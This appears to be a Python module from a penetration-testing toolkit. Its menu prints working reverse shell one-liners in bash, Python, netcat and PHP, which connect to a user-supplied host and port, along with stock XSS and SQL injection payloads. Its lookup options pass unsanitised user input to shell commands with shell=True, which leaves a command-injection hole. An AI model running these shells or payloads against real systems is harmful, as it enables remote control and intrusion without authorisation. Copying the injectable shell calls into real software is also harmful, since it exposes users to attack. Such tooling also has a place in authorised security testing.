"""
Misc Tools Module
"""
import base64
import json
import subprocess
from config import Colors as C


def run():
    while True:
        print(f"""{C.CYAN}{C.BOLD}
    ╔═══════════════════════════════════════════╗
    ║              MISC TOOLS                   ║
    ╠═══════════════════════════════════════════╣
    ║  {C.WHITE}[1]{C.CYAN}  Reverse Shell Generator             ║
    ║  {C.WHITE}[2]{C.CYAN}  Payload Generator                   ║
    ║  {C.WHITE}[3]{C.CYAN}  IP/Domain Info                      ║
    ║  {C.WHITE}[4]{C.CYAN}  DNS Lookup                          ║
    ║  {C.WHITE}[5]{C.CYAN}  Whois Lookup                        ║
    ║  {C.WHITE}[6]{C.CYAN}  JWT Decoder                         ║
    ║  {C.WHITE}[0]{C.CYAN}  Back                                ║
    ╚═══════════════════════════════════════════╝
        {C.RESET}""")

        choice = input(f"{C.MAGENTA}[?]{C.RESET} Select option: ").strip()

        if choice == "0":
            return
        elif choice == "1":
            ip = input(f"{C.MAGENTA}[?]{C.RESET} Your IP: ")
            port = input(f"{C.MAGENTA}[?]{C.RESET} Port [4444]: ") or "4444"
            print(f"\n{C.YELLOW}Bash:{C.RESET}")
            print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")
            print(f"\n{C.YELLOW}Python:{C.RESET}")
            print(f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'")
            print(f"\n{C.YELLOW}Netcat:{C.RESET}")
            print(f"nc -e /bin/sh {ip} {port}")
            print(f"\n{C.YELLOW}PHP:{C.RESET}")
            print(f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
        elif choice == "2":
            print(f"\n{C.YELLOW}XSS:{C.RESET}")
            for p in ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>',
                      '<svg onload=alert(1)>']:
                print(f"  {p}")
            print(f"\n{C.YELLOW}SQLi:{C.RESET}")
            for p in ["' OR '1'='1", "' OR 1=1--", "admin'--", "' UNION SELECT NULL--"]:
                print(f"  {p}")
        elif choice == "3":
            target = input(f"{C.MAGENTA}[?]{C.RESET} IP/domain: ")
            subprocess.run(f"curl -s https://ipinfo.io/{target}/json", shell=True)
        elif choice == "4":
            domain = input(f"{C.MAGENTA}[?]{C.RESET} Domain: ")
            subprocess.run(f"dig {domain} ANY +noall +answer", shell=True)
            subprocess.run(f"nslookup {domain}", shell=True)
        elif choice == "5":
            domain = input(f"{C.MAGENTA}[?]{C.RESET} Domain: ")
            subprocess.run(f"whois {domain}", shell=True)
        elif choice == "6":
            token = input(f"{C.MAGENTA}[?]{C.RESET} JWT: ")
            try:
                parts = token.split('.')
                for i, part in enumerate(parts[:2]):
                    padding = '=' * (4 - len(part) % 4)
                    decoded = base64.urlsafe_b64decode(part + padding).decode()
                    print(f"  {C.YELLOW}Part {i+1}:{C.RESET} {decoded}")
            except Exception as e:
                print(f"{C.RED}[-]{C.RESET} {e}")
        else:
            print(f"{C.RED}[-]{C.RESET} Invalid option")

        input(f"\n{C.DIM}Press Enter...{C.RESET}")
